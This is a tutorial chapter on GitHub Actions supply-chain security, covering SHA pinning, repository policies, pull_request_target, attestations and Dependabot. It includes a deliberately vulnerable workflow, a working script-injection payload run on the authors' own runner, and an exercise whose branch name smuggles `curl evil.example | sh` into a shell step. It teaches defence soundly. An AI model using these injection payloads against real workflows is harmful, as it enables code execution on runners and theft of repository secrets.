# Chapter 16: Supply-Chain Security: Pinning, Injection, Attestations

**Reading Time:** ~60 minutes
**Prerequisites:** Chapter 04 (`uses:` references), Chapter 07 (expressions), Chapter 15 (token permissions)
**Practice Notebook:** `notebooks/practice_16.ipynb`
**Reference Notebook:** `notebooks/lab_16_supply_chain_security.ipynb`
**Script:** `labs/lab_16_supply_chain_security.py`
**Book Reference:** Laster, Learning GitHub Actions Ch 9 / GitHub Docs: Secure use reference, Artifact attestations
**Depth:** Core
**Default Runtime:** Live repo

---

## Beginner's Guide

**Focus on first:** Sections 4 (the pin that pointed at the wrong thing), 7 (script injection, run for real) and 8 (`pull_request_target`, side by side with `pull_request`).

**Skip on first read:** Sections 10-12 (Dependabot tuning, code scanning, cache scope).

**Key concepts in plain English:**

- **Supply chain:** everything your pipeline trusts that you did not write: actions, the text of issues and pull requests, dependencies.
- **Pinning:** referring to an action by the immutable SHA of one commit, not a movable tag.
- **Script injection:** text from an outsider ending up *as code* in your script because GitHub pastes it in before the shell runs.
- **`pull_request_target`:** a pull-request trigger that runs the **base** repository's workflow with the base repository's privileges.
- **Attestation:** a signed statement, stored by GitHub, of how and where a file was built.

**If you have ever worried about `curl | bash`**, this chapter is that worry applied to every `uses:` line and every `${{ }}` in your workflows.

> **🔬 Platform Engineer's Lens:** Everything in this chapter was run for real. The injection executed a command on a runner. The PR trigger read attacker-controlled bytes in a privileged context. The two policies rejected our own workflows. And the most useful event was an accident: **we pinned an action to the wrong kind of SHA**, and only a bot's pull request revealed it. Supply-chain security is mostly small, checkable mistakes like that one.

> **🚦 Native vs Marketplace vs Custom:** All the controls here are native: SHA references, the repository's "require pinning" and "allow list" policies, `env:` for untrusted values, artifact attestations and Dependabot. The one Marketplace-style piece is the attestation action (`actions/attest-build-provenance`, first-party). Custom code is limited to checkers (`scripts/pin_actions.py`, `intro_gha/injection.py`) that make a convention enforceable in CI.

## What You'll Learn

- Pin every remote action to a commit SHA, with the version in a comment, and verify the pin is a *commit*
- Explain the difference between a tag, an annotated tag object and a commit, and why it matters for pins
- Enforce pinning and an allow list with repository policy, and read what each rejection looks like
- Demonstrate script injection and fix it with `env:`
- Compare what `pull_request` and `pull_request_target` each see, and why checking out PR code under the latter is dangerous
- Produce and verify an artifact attestation, and show a tampered file fail
- Let Dependabot keep pins current

## Table of Contents

<!-- TOC -->
- [1. What You Are Trusting](#1-what-you-are-trusting)
- [2. Running Example: Attacking Our Own Repository](#2-running-example-attacking-our-own-repository)
- [3. Pinning Every Action](#3-pinning-every-action)
- [4. The Pin That Pointed at the Wrong Thing](#4-the-pin-that-pointed-at-the-wrong-thing)
- [5. Making the Platform Enforce It](#5-making-the-platform-enforce-it)
- [6. Allow Lists](#6-allow-lists)
- [7. Script Injection, Run for Real](#7-script-injection-run-for-real)
- [8. `pull_request` Versus `pull_request_target`](#8-pull_request-versus-pull_request_target)
- [9. Attestations: Proof of Where a File Came From](#9-attestations-proof-of-where-a-file-came-from)
- [10. Dependabot for Actions](#10-dependabot-for-actions)
- [11. Scanning Workflows](#11-scanning-workflows)
- [12. Caches and Artifacts Are Inputs Too](#12-caches-and-artifacts-are-inputs-too)
- [13. Case Study: The Tag That Moved](#13-case-study-the-tag-that-moved)
- [14. Comparison: Referencing an Action](#14-comparison-referencing-an-action)
- [15. Practical Tips](#15-practical-tips)
- [16. Demonstrated Failure Modes](#16-demonstrated-failure-modes)
- [17. Key Takeaways](#17-key-takeaways)
- [18. Exercises](#18-exercises)
- [19. Additional Resources](#19-additional-resources)
- [20. Appendix A: Code Index](#20-appendix-a-code-index)
   - [A.1 Pin classification and the injection checker](#a1-pin-classification-and-the-injection-checker)
<!-- /TOC -->

---

## 1. What You Are Trusting

A workflow trusts, silently: each **action** it `uses`; each **value** interpolated into a script (issue titles, branch names, inputs); each **trigger** that hands it someone else's code; each **artifact** it downloads. An attacker needs only one. The defences are matched to the four: pin the actions, pass values as data, be careful what code a privileged trigger runs, and sign what you build.

## 2. Running Example: Attacking Our Own Repository

> 📌 **Running Example: six small workflows and one bot.** `ch16-injection.yml` (a vulnerable job and a safe job), `ch16-pr-context.yml` (listens to both `pull_request` and `pull_request_target`), `ch16-sha-policy.yml` (pinned, unpinned and tag-object-pinned jobs), `ch16-allowlist.yml` (a GitHub-owned and a third-party action), `ch16-attest.yml` (builds, attests and verifies a wheel) and `ch16-tag-object-sha.yml` (a probe). Plus **Dependabot**, configured in `.github/dependabot.yml`. Real runs: **37327434888** (injection), **37327726357** and **37327727095** (PR triggers), **37327868250** and **37327919016** (pinning policy off and on), **37328032337** and **37328071702** (allow list), **37328228420** (attestation), **37327302627** (tag-object probe). Data: `fixtures/security_ch16_summary.json`. We return to them throughout.

## 3. Pinning Every Action

Chapter 04 showed that `actions/checkout@v7` is a **movable** name that the runner resolves to a commit each run. A tag can be moved by the maintainer, or by whoever compromises the maintainer. Docs (verified 2026-10): "Pinning an action to a full-length commit SHA is currently the only way to use an action as an immutable release", and doing so means an attacker "would need to generate a SHA-1 collision" to substitute code.

Two rules we adopted from this chapter on:

1. **Every remote `uses:` is a full 40-hex SHA with the version as a trailing comment**: `uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7`. The comment is for people and for Dependabot.
2. **A test enforces it.** `scripts/pin_actions.py` rewrote **29** references across this repo's workflows (resolving each tag with the API, dereferencing annotated tags), and `tests/test_workflow_yaml.py` now fails if a remote action is not SHA-pinned. The four workflows that teach unpinned forms on purpose are exempt by name.

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
- uses: astral-sh/setup-uv@c18668ad3cf93ea998bef934396af7bb5c839dc7 # v10.2.0
```

The cost of a pin is staleness: it never moves. Dependabot solves that (Section 4).

> 📝 **Full implementation:** See [Appendix A.1](#a1-pin-classification-and-the-injection-checker)

## 4. The Pin That Pointed at the Wrong Thing

We configured Dependabot for GitHub Actions (`package-ecosystem: github-actions`, weekly, grouped). Within **minutes** of pushing the file, it opened **pull request #3** by `app/dependabot`:

```
build(deps): bump pypa/gh-action-pypi-publish from a892a5a6...  to dc37677b...  in the actions group
-  uses: pypa/gh-action-pypi-publish@a892a5a61159132606e93a2fa6f4358831b04d26 # v1.14.2
+  uses: pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33 # v1.14.2
```

Both lines say **v1.14.2**. Nothing was being upgraded. The bot was **correcting** a mistake of ours. We had written the first SHA by hand in Chapter 14 from this API call: `GET /repos/pypa/gh-action-pypi-publish/git/ref/tags/v1.14.2`. Checking what it returned:

| Name | Value | What it is |
| --- | --- | --- |
| `git/ref/tags/v1.14.2` `object.type` | **`tag`** | the ref points at a **tag object** |
| `object.sha` (what we pinned) | `a892a5a6...` | the annotated **tag object** |
| that tag object's `object` | `dc37677b...` (`commit`) | the **commit** the tag names |

Git has two kinds of tags. A **lightweight** tag points straight at a commit. An **annotated** tag is its own object (with a message and author) that *points at* a commit. For `checkout`, `setup-uv` and the AWS action the API said `commit`; for this one it said `tag`, and we copied the tag object's SHA. (`pin_actions.py` handles this correctly by dereferencing; we had bypassed it by hand.)

**Does it matter?** We tested. `ch16-tag-object-sha.yml` references the action both ways (run 37327302627):

| Reference | At "Set up job" | Later |
| --- | --- | --- |
| `@a892a5a6...` (tag object) | action **downloaded** (`SHA:a892a5a6...`) | failed at run time: `Trusted publishing exchange failure: OpenID Connect token retrieval failed` (we granted no `id-token`) |
| `@dc37677b...` (commit) | action downloaded (`SHA:dc37677b...`) | the identical run-time failure |

Both resolve and behave identically, so GitHub peels the tag object. But the log's `Download action repository '...' (SHA:...)` line for the first reports a SHA that **is not a commit**; tools that expect a commit may not handle it (we did not test which), and Dependabot, as we saw, did flag it. The fix, applied by hand after the bot closed its PR, is the commit SHA, plus a guard so it cannot recur:

```bash
uv run python scripts/pin_actions.py --verify     # each pin must be a commit
verify: 0 pin(s) are not commits
```

(The script checks `GET /repos/OWNER/REPO/git/commits/<sha>`; a tag-object SHA returns 404 there.) **Lesson:** automate pinning and verification; hand-copied SHAs are where the errors live.

## 5. Making the Platform Enforce It

A convention in your repo does not stop the next contributor. Repository policy does. `GET /repos/OWNER/REPO/actions/permissions` showed `"sha_pinning_required": false`. We turned it on (`PUT` the same endpoint with `sha_pinning_required: true`) and ran **the same workflow** before and after:

| Job | Policy off (run 37327868250) | Policy on (run 37327919016) |
| --- | --- | --- |
| `pinned` (`checkout@3d3c42e5...`) | success | **success** |
| `unpinned_tag` (`checkout@v7`) | success | **failure at `Set up job`** |
| `tag_object_sha` (Section 4) | set-up ok, fails later (OIDC) | **set-up still ok**, same later failure |

The rejection, as an annotation on the failed job:

```
The action actions/checkout@v7 is not allowed in Friend09/practice_git_intro_to_github_actions
because all actions must be pinned to a full-length commit SHA.
```

**What to notice:**

- It fails in **`Set up job`**: no step of the job ever runs, so no unpinned code executes.
- The policy checks for a **40-hex SHA**, not for "is a commit": the tag-object reference passed. That is why Section 4's `--verify` is still worth running.
- We turned the policy **back off** afterwards so Chapter 04's deliberately unpinned demos still work; in a real repository, leave it on.

## 6. Allow Lists

`allowed_actions` can be `all` (our setting) or `selected` with finer rules (the API also has a local-only mode, which we did not test). We switched this repo to **`selected`, GitHub-owned actions only** (`github_owned_allowed: true`, `verified_allowed: false`, no patterns) and ran a workflow with two jobs: `github_owned` (`actions/checkout`) and `third_party` (`astral-sh/setup-uv`).

| Policy | Result |
| --- | --- |
| `all` (run 37328032337) | both jobs **success** |
| `selected`, GitHub-owned only (run 37328071702) | the **whole run** concludes **`startup_failure`**, with **zero jobs** |

**What to notice:**

- The rejection is not per job. Even the `github_owned` job, which uses only an allowed action, **never ran**: GitHub rejects the workflow at **startup** if any `uses:` in it is disallowed.
- The API gave us no explanation: the run has no jobs, no check runs, and `gh run view` shows only `This run likely failed because of a workflow file issue.` (the same text as invalid YAML in Chapter 05). The reason is on the run page in the browser. A startup failure is easy to mistake for a syntax error.
- We restored `allowed_actions: all` afterwards.

## 7. Script Injection, Run for Real

Chapter 07 explained that `${{ }}` is pasted into the script **before** the shell runs. `ch16-injection.yml` takes a `title` input and uses it two ways:

```yaml
vulnerable:
  steps:
    - run: echo "REPORT vulnerable_title=${{ inputs.title }}"          # UNSAFE
safe:
  env:
    TITLE: ${{ inputs.title }}
  steps:
    - run: echo "REPORT safe_title=$TITLE"                             # SAFE
```

We dispatched it with this payload (run 37327434888), a quote that closes the string, then a command, then an opening quote to keep the syntax valid:

```
x"; echo "REPORT injected_user=$(id -un) injected_host=$(hostname | cut -c1-6)"; echo "
```

**Vulnerable job.** The log shows the script GitHub actually ran:

```
Run echo "REPORT vulnerable_title=x"; echo "REPORT injected_user=$(id -un) injected_host=$(hostname | cut -c1-6)"; echo ""
```

and the output included `injected_user=runner injected_host=runner`: **our payload ran as a command** on the runner. The "title" was a program.

**Safe job.** The identical payload was handed over as an **environment variable**, so the script text never changed. It printed the whole payload as inert text, including the literal `$(id -un)`, which was **not** executed.

| Job | Script text after substitution | Injected command ran? |
| --- | --- | --- |
| `vulnerable` | contains the payload's `; echo ... $(id -un) ...` | **yes** (`injected_user=runner`) |
| `safe` | unchanged: `echo "REPORT safe_title=$TITLE"` | **no** (`$(id -un)` printed literally) |

**What to notice:**

- Our payload only printed the username. A real attacker would run `curl` to send `$GITHUB_TOKEN` or a secret elsewhere, the reason Chapter 15's least privilege matters.
- **Linters help but do not catch everything.** `actionlint` flagged `github.event.pull_request.title` as "potentially untrusted" (Chapter 07) but **did not flag `inputs.title`**: a dispatch input can be set only by someone with write access, which is presumably why the linter treats it as semi-trusted (our guess; the tool does not say). Anyone who can pass text, or whose input reaches a workflow through a bot, can still exploit it. Treat every interpolated value you did not type yourself as hostile.
- Contexts an outsider commonly controls: `github.event.issue.title/body`, `github.event.pull_request.title/body`, `github.head_ref` (branch names are attacker-chosen), `github.event.comment.body`, `github.event.head_commit.message`, and `github.event.workflow_run.*`.
- Docs (verified 2026-10): prefer an action over an inline script, since an action receives context values as arguments rather than generating shell; otherwise "set the value of the expression to an intermediate environment variable".

`intro_gha/injection.py` finds these sites statically: it flags `${{ ... }}` over those contexts inside `run:`. Run over this repo, it finds exactly two workflows that interpolate dispatch inputs on purpose (`ch07-expressions.yml`, `ch16-injection.yml`); every other workflow passes values through `env:`. A test keeps it that way.

## 8. `pull_request` Versus `pull_request_target`

Both fire when a pull request is opened. They differ in **whose code and whose privileges**. We opened a real same-repository PR (#4) that changed **two** things: a data file `marker.txt` (`base-content` to `head-content`) and the workflow itself (`WORKFLOW_VERSION: base-version` to `head-version`). One workflow listens to both events. What each run saw:

| What the run saw | `pull_request` (run 37327726357) | `pull_request_target` (run 37327727095) |
| --- | --- | --- |
| Which workflow file ran | the **PR's** (`workflow_version=head-version`) | the **base branch's** (`workflow_version=base-version`) |
| `github.ref` | `refs/pull/4/merge` | `refs/heads/main` |
| `github.sha` | `11ad8f8` (the **merge commit**) | `26b759a` (the **base** tip) |
| Default `actions/checkout` content | the **PR's** (`marker=head-content`) | the **base's** (`marker=base-content`) |
| `github.event.pull_request.head.sha` | `b859f59` | `b859f59` (same PR head) |

So `pull_request_target` deliberately runs **trusted base code** and does **not** run the PR's edits to the workflow or the files, which is why it is allowed to use secrets and a write token (for fork PRs, `pull_request` gets a read-only token and no secrets, Chapters 08 and 15).

**The dangerous combination.** A second job, `checkout_head_under_target`, did what many real workflows do: under `pull_request_target`, it checked out the **PR head** explicitly (`ref: ${{ github.event.pull_request.head.sha }}`) and ran something from it. It read:

```
REPORT head_marker_under_target=head-content
```

That is the PR author's data, **inside the privileged context**. If the file were a script and the step ran it, an outside contributor's code would execute with the base repository's secrets and write token. Docs (verified 2026-10): "`pull_request_target` and `workflow_run` workflow triggers, when used with the checkout of an untrusted pull request, expose the repository to security compromises" and workflows with these triggers "must not explicitly check out untrusted code, including from pull request forks".

**Safe patterns:** use `pull_request` for anything that builds or tests PR code (no secrets, read-only for forks); use `pull_request_target` only for actions that need privileges but do not touch PR code (adding a label, posting a comment); if you must process PR content in a privileged step, split into two workflows and pass only **data**, never code (Chapter 06's `workflow_run` pattern), and treat that data as untrusted (Section 7). We did not test a fork PR (it needs a second account); the table is a same-repository PR.

## 9. Attestations: Proof of Where a File Came From

An **artifact attestation** is a signed record that a particular file (identified by its digest) was built by a particular workflow in a particular repository. `ch16-attest.yml` builds the Tally wheel and calls `actions/attest-build-provenance` (v4.2.2, pinned `4d101475...`) with `permissions: id-token: write` and `attestations: write`. Then a second job downloads the wheel and verifies it with the GitHub CLI.

| Check | Result (run 37328228420) |
| --- | --- |
| Wheel digest | `sha256:baec4267987d866bb1e98db092d595e0eb6a043e1c6ef28517866a693b0e5e91` |
| Digest in the verify job equals the build job's | **yes** |
| `gh attestation verify <wheel> --repo OWNER/REPO` in the workflow | **ok** |
| Predicate type | `https://slsa.dev/provenance/v1` (SLSA build provenance) |
| Signer identity | `.../.github/workflows/ch16-attest.yml@refs/heads/main` |
| The same verify **on my laptop**, with the downloaded artifact | **ok** (exit 0) |
| The wheel with **one byte appended** (digest `sha256:0d0363d4...`) | **rejected**: `HTTP 404: Not Found` on `.../attestations/sha256:0d0363d4...` |

**What to notice:**

- Verification is **by digest**: GitHub stores attestations keyed by the file's hash. Change one byte and the hash changes and **no attestation exists for it**: that is the 404.
- The signer identity names the **workflow file and ref** that built it. A consumer can require "built by `release.yml` on `main` in this repo" and refuse anything else (`gh attestation verify --signer-workflow ...`; we did not exercise that flag).
- It works **off the runner**: I verified on a laptop with only `gh` and the file.
- **What it does not prove:** that the code is safe or the build clean. It proves *origin*: this workflow, this repository, this commit produced these bytes. A compromised workflow would attest compromised output. Combine with Sections 3 to 8.

## 10. Dependabot for Actions

> ⚠️ ADVANCED TOPIC: Skip on first read.

Our `.github/dependabot.yml`: `package-ecosystem: github-actions`, `interval: weekly`, one **group** `actions` with pattern `*` (so all bumps arrive as one PR). We observed Dependabot parse a SHA pin with a `# vX.Y.Z` comment: it opened PR #3 within minutes (Section 4) and left the comment intact. (The Dependabot docs page we cited does not itself discuss SHA pins, so this is observed behavior; we did not see it perform a real version bump.) Its pull requests run your CI like any other, which is where you review a bump. We saw one detail worth knowing: PR #3's CI failed because it branched from a commit that still contained one of our own lint errors; asking the bot to rebase (`@dependabot rebase`) is the usual fix, and in our case it simply closed the PR.

## 11. Scanning Workflows

> ⚠️ ADVANCED TOPIC: Skip on first read.

The docs we read (verified 2026-10) recommend code scanning to detect vulnerable workflow patterns and OpenSSF Scorecards for supply-chain posture. `actionlint` (Chapter 17) and our two checkers cover the same ground locally and in CI. We did not enable code scanning in this repository.

## 12. Caches and Artifacts Are Inputs Too

> ⚠️ ADVANCED TOPIC: Skip on first read.

A cache or artifact written by one run is read by a later one (Chapter 09). If a low-trust workflow (a PR build) can write a cache key that a high-trust workflow (a release) restores, content crosses a trust boundary. Cache scope rules help (a run restores from its own branch, the default branch and the base branch, per the docs), but treat restored files as inputs: verify digests, and do not let release jobs restore caches written by PR builds.

## 13. Case Study: The Tag That Moved

A popular action's maintainer account is compromised. The attacker re-points the `v3` tag at a commit that prints every secret in the job environment, to the log, encoded. Repositories referencing `@v3` pick it up on their next run; repositories referencing a SHA do not. Of the exposed repositories, the ones with `permissions: contents: read` leak only a read-only token, and the ones with `write-all` leak a credential that can publish releases. (This case is constructed to connect Sections 3 and 4 to Chapter 15; we did not reproduce an attack on a real action.)

## 14. Comparison: Referencing an Action

| Approach | Setup Effort | Control | Failure Visibility | Security Exposure | Maintenance Burden |
| --- | --- | --- | --- | --- | --- |
| Floating tag (`@v7`) | Minimal - copy one line | Weak - maintainer decides | Fair - log shows the SHA used | High - a moved tag runs new code | Low - updates arrive silently |
| Exact tag (`@v7.0.1`) | Minimal | Moderate | Fair | Moderate - tags can still move | Moderate - manual bumps |
| Full commit SHA + comment | Low - a script resolves it | Excellent - immutable | Strong - the exact commit is named | Low | Moderate - needs Dependabot |
| Pinned + `sha_pinning_required` policy | Low - one setting | Excellent - cannot be bypassed | Excellent - fails at Set up job | Very Low | Moderate |
| Pinned + allow list | Moderate - curate the list | Excellent | Fair - `startup_failure` is terse | Very Low | Moderate - maintain the list |

## 15. Practical Tips

- Pin with a script, never by hand; run `--verify` so every pin is a commit.
- Keep the version in a `# v1.2.3` comment so Dependabot can update the pin.
- Turn on `sha_pinning_required`; add an allow list if your organization can maintain one.
- Never write `${{ }}` of an outsider-controlled value inside `run:`; pass it through `env:`.
- Do not check out PR head code under `pull_request_target` or `workflow_run`.
- Give each job the least token permission (Chapter 15) so an injection or a bad action can do little.
- Attest what you release, and verify attestations before deploying.
- Remember that a policy rejection may be a `startup_failure` with no jobs and no API message.

## 16. Demonstrated Failure Modes

**Failure 1: the wrong kind of SHA.** `a892a5a6...` was a tag object, not a commit. Both resolved, but Dependabot corrected it. Fix: `pin_actions.py` and `--verify`.

**Failure 2: the unpinned action under policy.** `The action actions/checkout@v7 is not allowed ... because all actions must be pinned to a full-length commit SHA.` at `Set up job`. Fix: pin.

**Failure 3: the policy that passes the wrong thing.** The tag-object reference satisfied `sha_pinning_required`. Fix: `--verify`.

**Failure 4: the all-or-nothing allow list.** One disallowed action turned the whole run into a `startup_failure` with zero jobs. Fix: keep the list in sync with your workflows.

**Failure 5: the title that was a program.** `injected_user=runner` from a "title". Fix: `env:`.

**Failure 6: the linter that stayed quiet.** `actionlint` did not flag `inputs.title`. Fix: your own check (`injection_sites`) and review.

**Failure 7: attacker bytes in the privileged job.** `head_marker_under_target=head-content` under `pull_request_target`. Fix: never check out PR head there.

**Failure 8: the tampered artifact.** One appended byte, `HTTP 404`. Not a failure: the control working.

## 17. Key Takeaways

- Pin every remote action to a commit SHA with the version as a comment; enforce it with a test and with `sha_pinning_required`.
- An annotated tag's ref points at a **tag object**; pin the **commit** it names. Verify pins programmatically.
- Dependabot understands SHA pins and will propose updates (and, as we saw, corrections).
- An allow-list violation fails the **entire run** at startup with no job and no API message.
- `${{ }}` is substituted before the shell; pass outsider-controlled values through `env:`.
- `pull_request_target` runs the base workflow with base privileges; never check out PR head there.
- Attestations bind a file's digest to the workflow that built it; one changed byte means no attestation.
- Least-privilege tokens limit the blast radius of every other mistake.

## 18. Exercises

1. Why is `actions/checkout@3d3c42e5...# v7` safer than `actions/checkout@v7`, and what is the comment for?
2. `git/ref/tags/vX` returns `"type": "tag"`. What do you do to get the SHA to pin?
3. A step is `run: echo "${{ github.head_ref }}"`. A contributor names their branch `x"; curl evil.example | sh; echo "`. What happens, and what is the fix?
4. Which of these should a `pull_request_target` workflow never do: add a label to the PR, post a comment, check out `github.event.pull_request.head.sha` and run its test script?
5. (Hand arithmetic) An attested wheel has digest `sha256:baec...`. You append one byte. What does `gh attestation verify` look up, and what does it find?

<details>
<summary>Answers</summary>

1. The SHA is immutable: it names one exact commit, so a moved tag cannot change what runs. The comment records the human version and lets Dependabot propose a bump.
2. Dereference the tag object: `GET /repos/OWNER/REPO/git/tags/<sha>` and use its `object.sha` (the commit). Then `--verify` that `GET /git/commits/<sha>` succeeds.
3. The branch name is substituted into the script and the quote closes the string, so `curl evil.example | sh` **runs** on the runner (branch names are attacker-chosen). Fix: `env: BRANCH: ${{ github.head_ref }}` and `run: echo "$BRANCH"`.
4. Never check out the PR head and run its script (the third). Adding a label and posting a comment do not execute PR code.
5. It looks up attestations for the **new** digest (`sha256:0d0363d4...`) and finds none: `HTTP 404 Not Found`.

</details>

## 19. Additional Resources

All verified 2026-10.

- GitHub Docs: Secure use reference (pinning, injection, `pull_request_target`) - https://docs.github.com/en/actions/reference/security/secure-use
- GitHub Docs: Workflow syntax (permissions) - https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#permissions
- GitHub REST: Actions permissions (including `sha_pinning_required` and selected actions) - https://docs.github.com/en/rest/actions/permissions
- actions/attest-build-provenance - https://github.com/actions/attest-build-provenance
- SLSA build provenance specification - https://slsa.dev/spec/v1.0/provenance
- GitHub Docs: Keeping your actions up to date with Dependabot - https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot
- Live evidence: runs 37327302627, 37327434888, 37327726357, 37327727095, 37327868250, 37327919016, 37328032337, 37328071702, 37328228420 and Dependabot PR #3 in this repo
- Laster, *Learning GitHub Actions* (O'Reilly), Chapter 9

## 20. Appendix A: Code Index

> 💻 Complete, runnable code for this chapter. Skip when reading for concepts.

### A.1 Pin classification and the injection checker

```python
from intro_gha import WORKFLOWS_DIR
from intro_gha.injection import injection_sites, interpolate
from intro_gha.pinning import classify, unpinned
from intro_gha.workflow import load_workflow

SHA = "3d3c42e5aac5ba805825da76410c181273ba90b1"
assert classify(f"actions/checkout@{SHA}") == "sha"
assert classify("actions/checkout@v7") == "tag-or-branch"
assert classify("actions/checkout@" + SHA[:7]) == "tag-or-branch"   # short SHAs move

wf = load_workflow(WORKFLOWS_DIR / "ch11-python-ci.yml")
assert unpinned(wf) == []                      # every remote action is pinned

payload = 'x"; echo "REPORT injected_user=$(id -un)"; echo "'
script = 'echo "REPORT vulnerable_title=${{ inputs.title }}"'
assert 'injected_user=$(id -un)"; echo ""' in interpolate(script, {"inputs.title": payload})
assert [s[0] for s in injection_sites(load_workflow(
    WORKFLOWS_DIR / "ch16-injection.yml"))] == ["vulnerable"]
```

**Flow:** classify each `uses:` as local, docker, a 40-hex SHA or movable; substitute `${{ }}` into a script as the runner does and see the payload become code; flag `run:` steps that interpolate outsider-influenced contexts.
